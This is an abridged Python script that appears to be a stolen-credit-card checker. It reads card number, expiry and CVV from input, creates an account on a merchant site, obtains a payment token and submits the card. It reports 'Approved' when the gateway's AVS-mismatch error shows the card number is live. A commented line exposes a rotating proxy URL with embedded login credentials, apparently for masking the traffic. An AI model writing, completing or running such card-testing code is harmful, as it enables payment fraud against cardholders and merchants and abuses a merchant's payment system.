...
def setso(card_input):
  #  proxy = {"http://": "http://5lsbptwhow0s8kt-country-us:qcok25i88ff4ers@rp.scrapegw.com:6060","https://": "http://5lsbptwhow0s8kt-country-us:qcok25i88ff4ers@rp.scrapegw.com:6060",}
    ...
    while True:
        ...
        try:
            ...
            first_grab =  session.get(main_page)
            if first_grab.status_code == 200:
                ...
                signup_resp =  session.post(signup_push, data=signup_data, headers=head1, cookies=jar)
                ...
                if signup_resp.status_code == 200:
                    ...
                    fetch_resp =  session.get(fetch_page, params=fetch_params, headers=head2)
                    ...
                    tok_resp =  session.post(tok_push, data=tok_data, headers=head3)
                    ...
                    card_resp =  session.post(card_push, data=card_data, headers=head4)
                    ...
                    if result_code == "Error":
                        ...
                        if 'The transaction has been declined because of an AVS mismatch. The address provided does not match billing address of cardholder.' in card_resp.text:
                            output = 'Approved! ✅',f"({error_code}) - {error_msg}"
                        
                        else:
                            output = 'Declined! ❌',f"({error_code}) - {error_msg}"
                    
                    else:
                        output = 'Approved! ✅','Approvado AVS:True '

                    return output
                

        except :
            output = 'Declined! ❌',"(E00027) - This transaction has been declined"


card_input = input("CC|MM|YY|CVV:")        
chk = setso(card_input)
